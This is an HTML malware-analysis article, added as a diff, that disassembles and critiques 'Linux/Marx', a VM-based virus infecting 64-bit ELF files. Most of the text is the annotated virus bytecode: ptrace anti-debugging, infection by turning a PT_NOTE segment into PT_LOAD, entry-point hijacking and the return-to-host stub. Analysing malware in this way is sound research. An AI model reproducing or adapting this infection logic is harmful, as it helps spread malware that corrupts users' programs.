@@ -1,0 +1,699 @@
+<html>
+<head>
+<title>MARX OF THE BEAST</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                                 ┌───────────────────────┐
+                                                                 ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                                 │ █   █ █ █ █   █       │
+                                                                 │ █   █ █ █ █▀▀▀▀       │
+                                                                 │ █   █   █ █     ▄     │
+                                                                 │                 ▄▄▄▄▄ │
+                                                                 │                 █   █ │
+                                                                 │                 █   █ │
+                                                                 │                 █▄▄▄█ │
+                                                                 │                 ▄   ▄ │
+                                                                 │                 █   █ │
+                                                                 │                 █   █ │
+                                                                 │                 █▄▄▄█ │
+                                                                 │                 ▄▄▄▄▄ │
+MARX OF THE BEAST                                                │                   █   │
+Linux/Marx                                                       │                   █   │
+~ qkumba                                                         └───────────────────█ ──┘
+
+Just what I needed today - a virus implemented as a virtual machine.  At least it's short.
+
+Linux/Marx is a direct-action infector of 64-bit x86-based ELF files in the current 
+directory, using the PT_LOAD technique.  Fasten your seatbelts, we're going to race 
+through the code.
+
+
+WHERE DO YOU WANT TO GO TODAY?
+
+The virus is implemented using 20 general registers, one stack register, and 1504 bytes of
+scratch memory (though it also moves the real stack pointer arbitrarily in order to access
+more memory).  There are 31 defined commands, but only 29 of them actually do anything.
+
+These are the commands:
+
+0x01    NOP
+0x02    PUSH reg32
+0x03    POP reg64
+0x04    MOV reg64_1, reg64_2
+0x05    XOR reg64_1, reg64_2
+0x06    SYSCALL imm8
+0x07    NOP
+0x08    SUB reg64_1, reg64_2
+0x09    ADD reg64_1, reg64_2
+0x0a    MOV reg64, RIP
+0x0b    PUSH imm8
+0x0c    PUSH imm16
+0x0d    PUSH imm32
+0x0e    JMP +/- imm16
+0x0f    MOV reg8, imm8
+0x10    MOV reg16, imm16
+0x11    MOV reg32, imm32
+0x12    CMP reg64_1, reg64_2 / JNE +/- imm16
+0x13    CMP reg64_1, reg64_2 / JE +/- imm16
+0x14    MOV reg8, [imm48]
+0x15    MOV reg8, [reg64]
+0x16    MOV reg16, [imm48]
+0x17    MOV reg16, [reg64]
+0x18    MOV reg32, [imm48]
+0x19    MOV reg32, [reg64]
+0x1a    MOV [imm48], reg8
+0x1b    MOV [reg64], reg8
+0x1c    MOV [imm48], reg16
+0x1d    MOV [reg64], reg16
+0x1e    MOV [imm48], reg32
+0x1f    MOV [reg64], reg32
+0x20    CMP reg64, 0 / JLE +/- imm16
+
+We see instructions for assigning values to registers, reading and writing almost arbitrary 
+(there are restrictions) memory, in different sizes, stack manipulation, basic arithmetic, 
+(conditional) transfer of control, and calling system APIs... everything that a growing VM 
+needs.  Interestingly, the CMP-and-branch combinations are implemented as a single 
+instruction each.  The branch instruction does not have its own address.
+
+
+SIZE DOES MATTER
+
+What we don't see from the outside are all of the little details and traps.  Internally, 
+each instruction is eight bytes long.  This format means that there is no way to work 
+directly with 64-bit values, despite the VM registers and memory slots being 64-bit 
+internally.  It is the same problem that the ARM architecture has, but it also lacks a 
+global pointer to data (there is access to RIP, which could theoretically allow access 
+to RIP-relative immediates, but the virus is not prepared to deal with them), and no shift
+instruction, so values beyond 32 bits have to be constructed by writing to memory, either 
+by (constructed) address, or using the stack.
+
+That leads us to the biggest issue with the implementation, which is that the memory 
+writes don't zero-extend.  It means that a "PUSH imm8" will leave 56 bits unchanged in 
+memory.  That might be considered acceptable behaviour since the instruction will adjust 
+the stack pointer by only one byte... until we try to pop the stack.  Why?  Because a 
+"POP" will pull all eight bytes from the stack, leading to an unbalanced stack and sadness.
+
+However, it also means that a "MOV REG32, []" will leave the upper 32 bits unchanged, 
+requiring an explicit "XOR reg, reg" before the "MOV" in order to have a fully-defined 
+register.  That leads to code bloat.  Given that the most common use of the memory reads 
+and writes is paired with the XOR, the MOV set could be reduced to just reg32-style, which 
+would cut eight instructions.  Given how many registers are available, the "imm48" option 
+could be removed, too, cutting another two instructions.
+
+The CMP set is interesting, too.  If the branch instructions were separated into individual
+instructions, then there would be a single CMP, and all of the branches could be encoded as
+a single instruction, by using a sub-byte to specify the type.  It would also allow for 
+more types of branches.
+
+
+MAKE MY DAY
+
+What does the virtualised virus code look like?  Here is a disassembly.
+
+0000 (0a):    MOV reg[11], RIP
+
+The virus starts by saving the execution address.  It is used later when infecting a file.
+
+0008 (0f):    MOV dil, 0x00
+0010 (0f):    MOV sil, 0x00
+0018 (0f):    MOV dl, 0x01
+0020 (0f):    MOV r10l, 0x00
+
+These MOV instructions are redundant here because all registers are initialised to zero by 
+the VM interpreter, but it's good programming practice to initialise them explicitly.
+
+0028 (06):    SYSCALL 101
+
+ptrace(PTRACE_TRACEME, 0, 1, 0).
+This is an anti-debugging technique.  The virus attempts to trace itself, which will fail 
+if a debugger is attached already.  Silvio Cesare published in 1999 a paper on Linux 
+anti-debugging techniques.  That paper included the non-zero value for the address 
+parameter.  However, it is unknown why he used that value, since none of the parameters 
+are ever read by the kernel in a TRACEME request.
+
+0030 (04):    MOV reg[02], RET
+0038 (0f):    MOV dil, 0x00
+0040 (12):    CMP reg[02], rdi    
+              JNE 0050  
+0048 (0e):    JMP 0060
+
+Save the return value from ptrace() call, compare it with zero (cannot use the "CMP ,0" 
+instruction because the branch type is wrong).  If the return value is non-zero, that's 
+an error, and an indication that a debugger is detected.
+
+0050 (0f):    MOV dil, 0x7b
+0058 (06):    SYSCALL 60
+
+If a debugger was detected, then exit the process with error code 123.  The host code is
+not executed.  The program just acquired debugger protection unintentionally.
+
+0060 (0f):    MOV dil, 0x01
+0068 (05):    XOR rsi, rsi
+0070 (04):    MOV rsi, SP
+
+This is an example of the "must XOR before MOV" due to the lack of zero-extension.  This 
+problem could be solved by changing the implementation to MOVZX-based instructions and 
+always writing all 64 bits.
+
+0078 (0d):    PUSH "ACAB"
+0080 (0f):    MOV dl, 0x04
+0088 (06):    SYSCALL 1
+
+write(stdout, "BACA", 4).
+Announce the presence of the virus.  Or something.
+
+0090 (05):    XOR rdi, rdi
+0098 (04):    MOV rdi, SP
+00a0 (0b):    PUSH '.'
+00a8 (05):    XOR rsi, rsi
+00b0 (06):    SYSCALL 2
+
+open(".", O_RDONLY).
+Open the current directory for reading.
+
+00b8 (04):    MOV rdi, RET
+00c0 (04):    MOV rsi, SP
+00c8 (05):    XOR rdx, rdx
+00d0 (10):    MOV dx, 0x0400
+00d8 (06):    SYSCALL 217
+
+getdents64(fd, &dirp, 1024).
+Fetch directory entries into the scratch space.
+This call might miss some entries if a few file filenames are very long, because it is 
+called only once.
+
+00e0 (04):    MOV reg[07], RET
+00e8 (09):    ADD SP, reg[03]
+
+Oops. Lucky that reg[03] is zero.  This looks like a left-over from code that was removed.
+
+00f0 (05):    XOR reg[06], reg[06]
+
+Initialise byte count within the array of entries.
+
+00f8 (04):    MOV reg[02], SP
+0100 (05):    XOR reg[03], reg[03]
+0108 (0f):    MOV regb[03], 0x13
+0110 (09):    ADD reg[02], reg[03]
+
+reg[02] now points to dirp.d_name[].
+
+0118 (04):    MOV reg[04], SP
+0120 (05):    XOR reg[05], reg[05]
+0128 (04):    MOV reg[05], SP
+0130 (0f):    MOV regb[03], 0x12
+0138 (09):    ADD reg[05], reg[03]
+
+reg[05] now points to dirp.d_type.
+
+0140 (15):    MOV regb[03], [reg[05]]
+
+Fetch the file type into low byte of reg[03].  The rest of the register was zeroed earlier.
+
+0148 (0e):    JMP 01b0
+
+This is a "while() {}" loop, not a "do {} while()", so jump to the end of the loop to check
+for the exit condition.
+
+0150 (04):    MOV SP, reg[04]
+
+This is the entry enumerator.  Restore the buffer pointer that might have been altered 
+during infection.
+
+0158 (05):    XOR reg[05], reg[05]
+0160 (04):    MOV reg[05], SP
+0168 (05):    XOR reg[03], reg[03]
+0170 (0f):    MOV regb[03], 0x10
+0178 (09):    ADD reg[05], reg[03]
+
+reg[05] now points to dirp.d_reclen.
+
+0180 (05):    XOR reg[04], reg[04]
+0188 (17):    MOV regw[04], [reg[05]]
+0190 (09):    ADD reg[06], reg[04]
+
+Fetch reclen and adjust byte count accordingly.  This means that the first entry in the 
+directory is always skipped.  It is also technically a bug, since d_off should be used 
+instead of reclen to reach the next entry.
+
+0198 (09):    ADD SP, reg[04]
+01a0 (12):    CMP reg[06], reg[07]
+              JNE 00f8
+
+Adjust the buffer pointer correspondingly, and branch until all bytes read.  As noted 
+previously, the use of reclen instead of d_off could result in mismatched offsets and 
+this loop not exiting when expected.
+
+01a8 (0e):    JMP 0750
+
+Jump out of bounds.  The interpreter will detect this case and exit.  Beyond this point 
+there could be stored 64-bit immediates that the code could read, which would avoid the 
+need to construct values.
+
+01b0 (05):    XOR reg[08], reg[08]
+01b8 (0f):    MOV regb[08], 0x08
+01c0 (12):    CMP reg[03], reg[08]
+              JNE 0150
+
+Branch if d_type is not DT_REG. That is, if the entry does not describe a regular file.
+
+01c8 (04):    MOV reg[12], reg[02]
+01d0 (04):    MOV rdi, reg[02]
+01d8 (05):    XOR rsi, rsi
+01e0 (10):    MOV si, 0x0402
+01e8 (06):    SYSCALL 2
+
+open(d_name, O_RDWR | O_NOCTTY).
+It is unknown why NOCTTY is specified while opening a regular file.
+
+01f0 (20):    CMP RET, 0
+              JLE 0150
+
+Branch if the file-open request failed.
+
+01f8 (04):    MOV reg[02], RET
+
+reg[02] now holds the file descriptor.
+
+0200 (04):    MOV rdi, reg[02]
+0208 (04):    MOV rsi, SP
+0210 (10):    MOV regw[08], 0x1000
+0218 (09):    ADD rsi, reg[08]
+
+Point to far far away.  This is a dangerous idea since the stack pointer is crossing a 
+page.  The safer alternative would have been to go downwards in memory and probe the 
+memory first.
+
+0220 (06):    SYSCALL 5
+
+fstat(fd, &statbuf).
+
+0228 (05):    XOR reg[08], reg[08]
+0230 (0f):    MOV regb[08], 0x30
+0238 (09):    ADD rsi, reg[08]
+0240 (04):    MOV reg[09], rsi
+
+reg[09] now points to fd.st_size.
+
+0248 (05):    XOR rsi, rsi
+0250 (05):    XOR rdi, rdi
+0258 (19):    MOV esi, [reg[09]]
+0260 (0f):    MOV regb[08], 0x06
+0268 (04):    MOV rdx, reg[08]
+0270 (0f):    MOV regb[08], 0x01
+0278 (04):    MOV r10, reg[08]
+0280 (04):    MOV r8, reg[02]
+0288 (05):    XOR r9, r9
+0290 (06):    SYSCALL 9
+
+mmap(0, file size, PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0).
+It is unknown why EXEC permission is requested, given that the map is only ever read 
+and written.
+
+0298 (19):    MOV edi, [regd[09]]
+02a0 (04):    MOV reg[09], rdi
+
+reg[09] now holds the file size.  This could have been achieved earlier and saved one 
+instruction.
+
+02a8 (04):    MOV reg[10], RET
+
+reg[10] now holds the returned map pointer.  The virus assume that the request always 
+succeeds.
+
+02b0 (05):    XOR reg[05], reg[05]
+02b8 (19):    MOV regd[05], [reg[10]]
+
+reg[05] now holds the first four bytes of the file, the contents of EI_MAGIC.
+
+02c0 (11):    MOV regd[08], 0x464c457f
+02c8 (12):    CMP reg[08], reg[05]
+              JNE 0348
+
+Branch if the file is not an ELF. That is, EI_MAGIC does not match "\x7FELF".
+
+02d0 (05):    XOR reg[08], reg[08]
+02d8 (0f):    MOV regb[08], 0x04
+02e0 (04):    MOV reg[05], reg[10]
+02e8 (09):    ADD reg[05], reg[08]
+
+reg[05] now points to Ehdr.e_ident[EI_CLASS].
+
+02f0 (05):    XOR rdi, rdi
+02f8 (15):    MOV dil, [reg[05]]
+
+Fetch the class into low byte of rdi.
+
+0300 (0f):    MOV regb[08], 0x02
+0308 (12):    CMP reg[08], rdi
+              JNE 0348
+
+Branch if the file is not 64-bit.  That is, EI_CLASS is not ELFCLASS64.
+
+0310 (05):    XOR reg[08], reg[08]
+0318 (0f):    MOV regb[08], 0x09
+0320 (04):    MOV reg[05], reg[10]
+0328 (09):    ADD reg[05], reg[08]
+
+reg[05] now points to Ehdr.e_ident[EI_PAD].
+
+0330 (19):    MOV edi, [reg[05]]
+
+rdi now holds the first four bytes of the padding.
+
+0338 (11):    MOV regd[08], 0xdeadc0de
+0340 (12):    CMP reg[08], rdi
+              JNE 0368
+
+Branch if the file is not infected already.  That is, EI_PAD does not hold "0xdeadc0de".
+
+0348 (05):    XOR reg[08], reg[08]
+0350 (04):    MOV rdi, reg[02]
+0358 (06):    SYSCALL 3
+
+close(fd).
+
+0360 (0e):    JMP 0128
+
+The file is infected, jump to ... where?  It's the wrong target address!  It should have
+been 0150.  Bad things are about to happen.
+
+0368 (05):    XOR reg[08], reg[08]
+0370 (05):    XOR reg[05], reg[05]
+0378 (0f):    MOV regb[08], 0x20
+0380 (04):    MOV rdi, reg[10]
+0388 (09):    ADD rdi, reg[08]
+
+This is the happy path - the file is not infected.
+rdi now points to Ehdr.e_phoff.
+
+0390 (19):    MOV regd[05], [rdi]
+
+reg[05] now holds the PHT offset.  Remember this.  There will be a quiz later.
+
+0398 (0f):    MOV regb[08], 0x16
+03a0 (09):    ADD rdi, reg[08]
+
+rdi now points to Ehdr.e_phentsize.
+
+03a8 (17):    MOV si, [rdi]
+
+rsi now holds the PHT entry size.
+
+03b0 (0f):    MOV regb[08], 0x02
+03b8 (09):    ADD rdi, reg[08]
+
+rdi now points to Ehdr.e_phnum.
+
+03c0 (17):    MOV regw[08], [rdi]
+
+reg[08] now holds the number of program header entries.
+
+03c8 (09):    ADD reg[05], rsi
+
+Move to the next program header entry.  Yes, the first entry is always skipped.  
+The assumption here is that the entry of interest will never be first.
+
+03d0 (05):    XOR rdi, rdi
+03d8 (0f):    MOV dil, 0x01
+03e0 (08):    SUB reg[08], rdi
+03e8 (04):    MOV rdi, reg[10]
+03f0 (09):    ADD rdi, reg[05]
+
+rdi now points to a Elf64_Phdr.
+
+03f8 (05):    XOR rdx, rdx
+0400 (15):    MOV dl, [rdi]
+
+rdx now holds the Elf64_Phdr.p_type.
+
+0408 (04):    MOV rdi, rdx
+0410 (05):    XOR rdx, rdx
+0418 (0f):    MOV dl, 0x04
+0420 (13):    CMP rdi, rdx
+              JE 0438
+
+Branch if the interesting entry type is found.  That is, p_type is PT_NOTE.
+
+0428 (05):    XOR rdx, rdx
+0430 (12):    CMP reg[08], rdx
+              JNE 03c8
+
+Otherwise, branch while entries remain to check.  THEN FALL THROUGH ANYWAY.
+Any file that has no note entry will be have its last program header altered unexpectedly,
+and an infection marker added.
+
+0438 (04):    MOV rdi, reg[10]
+0440 (05):    XOR rdx, rdx
+0448 (0f):    MOV dl, 0x09
+0450 (09):    ADD rdi, rdx
+
+rdi now points to Ehdr.e_ident[EI_PAD].
+
+0458 (11):    MOV edx, 0xdeadc0de
+0460 (1f):    MOV [rdi], edx
+
+Mark the file as infected.  The virus code expects to succeed in all subsequent operations
+on the file.  If nothing else, this marker serves as an inoculation against infection by 
+the same virus.  Of course, since this space is used very commonly by other viruses to 
+store their infection marker, it's possible to end up with "sandwiches" of alternating 
+virus infections.
+
+0468 (04):    MOV rdi, reg[10]
+0470 (09):    ADD rdi, reg[05]
+
+rdi now points to the note entry.  Keeping track of all of these registers is one of the 
+challenges when working through VM code, especially when registers are reused heavily.
+
+0478 (05):    XOR rdx, rdx
+0480 (0f):    MOV dl, 0x01
+0488 (1f):    MOV [rdi], edx
+
+Convert program header type from PT_NOTE to PT_LOAD, a loadable segment.
+
+0490 (04):    MOV rdi, reg[10]
+0498 (09):    ADD rdi, reg[05]
+
+rdi now points to the new loadable segment.  Or, really, to exactly where it was already. 
+We're not in a constrained environment.  Performance is not a concern.  
+Go ahead, I won't judge.
+
+04a0 (0f):    MOV dl, 0x04
+04a8 (09):    ADD rdi, rdx
+
+rdi now points to Elf64_Phdr.p_flags.
+
+04b0 (05):    XOR rdx, rdx
+04b8 (0f):    MOV dl, 0x07
+04c0 (1f):    MOV [rdi], edx
+
+Mark segment executable, readable, and writable.  The executable and readable are obvious 
+requirements.  It is unknown why the writable flag is used.
+
+04c8 (04):    MOV rdi, reg[10]
+04d0 (09):    ADD rdi, reg[05]
+
+rdi now points to the new loadable segment.  Could have just subtracted instead.
+
+04d8 (0f):    MOV dl, 0x20
+04e0 (09):    ADD rdi, rdx
+
+rdi now points to Elf64_Phdr.p_filesz.
+
+04e8 (19):    MOV r10d, [rdi]
+04f0 (10):    MOV dx, 0x0e8e
+04f8 (09):    ADD r10, rdx
+0500 (1f):    MOV [rdi], r10d
+
+Increase the size of the segment in the file.
+
+0508 (04):    MOV rdi, reg[10]
+0510 (09):    ADD rdi, reg[05]
+
+rdi now points to the new loadable segment.  Could have put this value in another register.
+There are so many.
+
+0518 (05):    XOR rdx, rdx
+0520 (0f):    MOV dl, 0x28
+0528 (09):    ADD rdi, rdx
+
+rdi now points to Elf64_Phdr.p_memsz.
+
+0530 (19):    MOV r10d, [rdi]
+0538 (10):    MOV dx, 0x0e8e
+0540 (09):    ADD r10, rdx
+0548 (1f):    MOV [rdi], r10d
+
+Increase the length of the segment in memory.  There is no check if the increase in size 
+will be overlapped by a later segment.
+
+0550 (05):    XOR rdx, rdx
+0558 (0f):    MOV dl, 0x20
+0560 (08):    SUB rdi, rdx
+
+rdi now points to Elf64_Phdr.p_offset.  Hey, subtract!  Just in time.  It's the last one.
+
+0568 (1f):    MOV [rdi], regd[09]
+
+Change the program header's offset to the original end-of-file.
+
+0570 (05):    XOR r10, r10
+0578 (11):    MOV r10d, 0x0c000000
+0580 (09):    ADD r10, reg[09]
+
+Construct 0x0c000000 + original file size, as the location in memory for the segment to 
+load.
+
+0588 (04):    MOV rdi, reg[10]
+0590 (0f):    MOV dl, 0x18
+0598 (09):    ADD rdi, rdx
+
+rdi now points to Elf64_Ehdr.e_entry.
+
+05a0 (19):    MOV r8d, [rdi]
+
+r8 now holds the original entry-point address.
+
+05a8 (1f):    MOV [rdi], r10d
+
+Set new entry-point to 0x0c000000 + original file size.
+
+05b0 (05):    XOR rdx, rdx
+05b8 (0f):    MOV dl, 0x08
+05c0 (08):    SUB rdi, rdx
+05c8 (09):    ADD rdi, reg[05]
+
+rdi now points to Elf64_Phdr.p_vaddr.
+
+05d0 (1f):    MOV [rdi], r10d
+
+Set the program header entry virtual address to 0x0c000000 + original file size.
+
+05d8 (05):    XOR r9, r9
+05e0 (10):    MOV r9w, 0x1040
+05e8 (09):    ADD SP, r9
+
+Point to even more far far away.  Another page-crossing, extra dangerous.
+
+05f0 (04):    MOV r9, SP
+05f8 (0d):    PUSH 0xffffe8e8 call get_RIP
+0600 (0d):    PUSH 0x932d48ff sub rax
+0608 (0b):    PUSH 0x01       , 0x193
+0610 (0d):    PUSH 0x2d480000 sub rax
+0618 (02):    PUSH r10        , 0x0c000000 + original file size
+0620 (0c):    PUSH 0x0548     add rax
+0628 (02):    PUSH r8         original entry-point
+0630 (0d):    PUSH 0xfff4894c mov rsp, r14
+0638 (0b):    PUSH 0xe0       jmp rax
+
+Construct this code in memory:
+
+call get_RIP
+sub  rax, 0x193
+sub  rax, 0x0c000000 + original file size
+add  rax, original entry-point
+mov  rsp, r14
+jmp  rax
+
+This is how the virus transfers control to the host original entry-point (OEP) on 
+completion.
+
+It's easier to perform the individual operations on the real CPU than to try to do 
+the arithmetic in the VM.
+
+0640 (04):    MOV rdi, reg[10]
+0648 (04):    MOV rsi, reg[09]
+0650 (05):    XOR rdx, rdx
+0658 (0f):    MOV dl, 0x04
+0660 (06):    SYSCALL 26
+
+msync(mmap, file size, MS_SYNC).
+Flush the altered mapped memory back to the disk.  Now we have a file that is marked 
+infected, with an altered entry-point, but no virus content.  We also have a 
+race-condition with a potential request to run the file before the infection completes.
+
+There's an interesting side-effect to the sync operation - the file offset is at the 
+end of the file, so no need to seek there.
+
+0668 (06):    SYSCALL 11
+
+munmap(mmap, file size).
+
+0670 (04):    MOV rdi, reg[02]
+0678 (10):    MOV dx, 0x03bc
+0680 (04):    MOV rsi, reg[11]
+
+Here's the one time that we use RIP.
+
+0688 (08):    SUB rsi, rdx
+0690 (05):    XOR rdx, rdx
+0698 (10):    MOV dx, 0x0e8e
+06a0 (06):    SYSCALL 1
+
+write(fd, start of virus code, size).
+
+06a8 (06):    SYSCALL 3
+
+close(fd).
+Now we have a file that is marked infected, with an altered entry-point, and actual virus
+content, but no code to return control to the host.  The race continues.
+
+06b0 (04):    MOV rdi, reg[12]
+
+rdi now points to dirp.d_name[].
+
+06b8 (05):    XOR rsi, rsi
+06c0 (0f):    MOV sil, 0x02
+06c8 (06):    SYSCALL 2
+
+open(d_name, O_RDWR).
+This could have been WRONLY, given what's about to happen.
+
+06d0 (04):    MOV rdi, RET
+06d8 (05):    XOR rsi, rsi
+06e0 (10):    MOV si, 0x018e
+06e8 (09):    ADD rsi, reg[09]
+06f0 (05):    XOR rdx, rdx
+06f8 (06):    SYSCALL 8
+
+lseek(fd, location of OEP transfer code, SEEK_SET).
+
+0700 (05):    XOR rdx, rdx
+0708 (0f):    MOV dl, 0x1c
+0710 (04):    MOV rsi, r9
+0718 (06):    SYSCALL 1
+
+write(fd, OEP transfer code, size of OEP transfer code).
+
+0720 (06):    SYSCALL 3
+
+close(fd).
+Hey, we have a fully-infected file!
+
+0728 (05):    XOR r9, r9
+0730 (10):    MOV r9w, 0x1040
+0738 (08):    SUB SP, r9
+
+That was unexpected.  0x1040 was the size of the addition, but it misses the OEP transfer
+code that was pushed onto the stack.  It also misses the additional 0x1000 bytes that were
+added when the file was opened.  If this value were used then there would be a progressive
+stack-leak.  Hilarity ensures.
+
+0740 (0e):    JMP 0150
+
+Move to the next entry in the directory list.  The code at 0150 also restores the stack 
+pointer correctly.
+
+0748 (01):    NOP
+
+Unused as an instruction, used as bounds checking by the interpreter.
+
+
+CONCLUSION
+
+Writing even a simple virus is far from simple.  Writing a VM is also far from simple.  
+Combining the two is a recipe for disaster.
+</pre></body></html>
